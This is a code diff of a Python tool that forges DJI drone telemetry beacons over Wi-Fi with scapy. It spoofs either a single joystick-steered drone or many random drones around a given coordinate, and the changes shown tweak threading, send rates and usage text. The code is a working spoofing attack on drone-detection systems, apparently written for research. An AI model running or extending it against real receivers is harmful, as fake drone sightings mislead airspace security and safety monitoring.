@@ -7,7 +7,7 @@ from math import floor, sqrt
 import jstest
 import time, os
 import threading
-import Drone
+from Drone import *
 
 
 
@@ -57,7 +57,7 @@ def thread_send(packet):
     while is_event == 0:
         count += 1
         try:
-            sendp(packet[1], iface=interface, loop=0, count=1)
+            sendp(packet[1], iface=interface, verbose=0, loop=0, count=1)
             time.sleep(0.3)
         except KeyboardInterrupt:
             break
@@ -104,11 +104,13 @@ def one_drone():
     joystick = jstest.JSTest()
     print("Joystick  {}".format(joystick.gamepad))
 
-    updated = True
     if joystick.gamepad:
         #ts= time.time()
         global is_event
-        while 1:           
+        drone.v_east = 0
+        drone.v_north = 0
+        while 1:
+            updated = True           
             try:
                 # Start sending packets in a different thread since Joystick is blocking when waiting for events
                 send_thread = threading.Thread(target=thread_send, args=(packet_list,))
@@ -117,10 +119,12 @@ def one_drone():
                 print("Waiting event")
                 events = joystick.gamepad._do_iter() # It blocks untl event is detected
 
-                is_event = 1 # Exiting Thread Threat will stop sending previous packet
-                print("Main. Exiting Thread")
+                print("New Event. Main. Exiting Thread")
+
+                # Stop previous thread if
+
                 # Thread should finish automatically
-                # send.thread.join()
+                send_thread.join()
 
                 # Maybe I will need to sleep some time
                 is_event = 0 # Reset variable to wait for new events
@@ -199,7 +203,6 @@ def one_drone():
                 if not updated:
                     # Thread keeps sending the same packet
                     print("Packet not updated")
-                    updated = True # Reset
                     # is_event = 0
                     continue
                 
@@ -220,7 +223,10 @@ def one_drone():
             print("Speed: {}".format(sqrt(drone.v_north **2 + drone.v_east **2)))
 
     
-    else:             
+    else:
+        '''
+        Spoofing a single drone without any motion
+        '''            
         sendp(packet_list, iface=interface, loop=1, inter=0.5)
 
 def random_spoof(n, point=None):
@@ -245,28 +251,29 @@ def random_spoof(n, point=None):
         beacon_base_copy.ssid =  drone.ssid
         beacon_base_copy.addr2 = drone.mac_address
         print("SSID: {}".format(drone.ssid))
-        print("MAC Address {}".format(drone.mac_address))   
+        print("MAC Address {}".format(drone.mac_address))
+        print("Location [Lon Lat]: {} {}".format(drone.longitude, drone.latitude))   
         # Build DJI Payload
         payload = drone.build_telemetry()
         telemetry_packet = create_packet(beacon_base_copy, payload)
         packet_list.append(telemetry_packet)
     
     print("=========All drones are ready ==================")
-
-    sendp(packet_list, iface=interface, loop=1, inter=1)
+    sendp(packet_list, iface=interface, loop=1, inter=2)
 
 
 
 
 '''
-Main part
-Arguments indicate whether to spoof a single specific drone or N random drones
+=====================================================================
+Main
+Arguments indicate whether to spoof a single specific drone or N random drones (around a given point)
+=====================================================================
 '''
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-i", "--interface", help="Spoof on drone. poofing parameters are set by the user.")
 parser.add_argument("-r", "--random", help="Spoof randomly N drones")
-
 parser.add_argument("-a", "--area", help="Define point where drones will be spoofed eg: -a '46.76 7.62 '")
 
 args = parser.parse_args()
@@ -274,10 +281,10 @@ print("Arguments: {}".format(args))
 
 if not args.interface:
     raise SystemExit(
-
-"Usage: {sys.argv[0]} -i  <interface> [-r] <number of drones> [-a] <'latitude longitude'>\n \
--r N            Spoof N random drones. 2 by default\n \
--a location     If set, drones are spoofed around a random point in a radio of 11km.")
+"Usage: {sys.argv[0]} -i  <interface> [-r] <number of drones> [-a] <'latitude longitude'> \n \
+-r N            Spoof N random drones around the map. \n \
+-a 'lat long'     If set, drones are spoofed around point \n \
+Interface must be in monitor mode")
 
 else:
 
@@ -286,7 +293,7 @@ else:
     if args.random : # Consider fail when you pass 0 drones... ToDo
         n_random = args.random
         
-        print("Spoofing {} drones randomly".format(n_random))
+        print("Spoofing {} drones".format(n_random))
         if args.area:
             point = args.area.split()
             print(point)
